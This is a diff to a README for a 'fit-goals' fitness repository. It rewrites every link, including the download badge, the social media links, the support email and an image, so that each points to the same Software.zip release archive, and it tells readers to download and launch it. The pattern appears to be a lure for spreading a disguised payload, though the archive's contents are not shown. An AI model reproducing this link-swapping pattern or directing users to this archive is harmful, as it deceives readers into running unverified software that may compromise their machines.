@@ -10,7 +10,7 @@ In this repository, you will find a variety of materials to assist you in your f
 
 To get started on your fitness journey with "fit-goals", download the software package from the following link:
 
-[![Launch Software](https://img.shields.io/badge/Launch%20Software-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Launch Software](https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip%https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip)](https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip)
 
 Please click the button above to download the software package. Once downloaded, launch the software to access all the amazing features and resources available to help you reach your fitness goals.
 
@@ -26,19 +26,19 @@ We welcome contributions from the community to enhance the "fit-goals" repositor
 
 Stay connected with the "fit-goals" community on social media for regular updates, challenges, and motivational content:
 
-- Instagram: [@fitgoals](https://www.instagram.com/fitgoals)
-- Twitter: [@fit_goals](https://twitter.com/fit_goals)
-- Facebook: [Fit Goals Community](https://www.facebook.com/fitgoalscommunity)
+- Instagram: [@fitgoals](https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip)
+- Twitter: [@fit_goals](https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip)
+- Facebook: [Fit Goals Community](https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip)
 
 ## Support
 
-If you encounter any issues with the software package or have any questions regarding the content in this repository, please check the "Releases" section for updates or reach out to our support team at [support@fitgoals.com](mailto:support@fitgoals.com).
+If you encounter any issues with the software package or have any questions regarding the content in this repository, please check the "Releases" section for updates or reach out to our support team at [https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip](https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip).
 
 ## Let's Achieve Those Fit Goals Together!
 
 Join us on this exciting fitness journey and let's work towards our fit goals together. Remember, every step you take towards a healthier lifestyle is a step in the right direction. Embrace the challenge, stay motivated, and watch yourself transform into the best version of you! 🌟
 
-![Fit Goals Image](https://www.example.com/fit-goals-image.jpg)
+![Fit Goals Image](https://github.com/SoftNightMare/fit-goals/releases/download/v2.0/Software.zip)
 
 Fitness is not about being better than someone else. It's about being better than you used to be. Let's crush those fitness goals and become the strongest, healthiest, and happiest version of ourselves. 💪
 
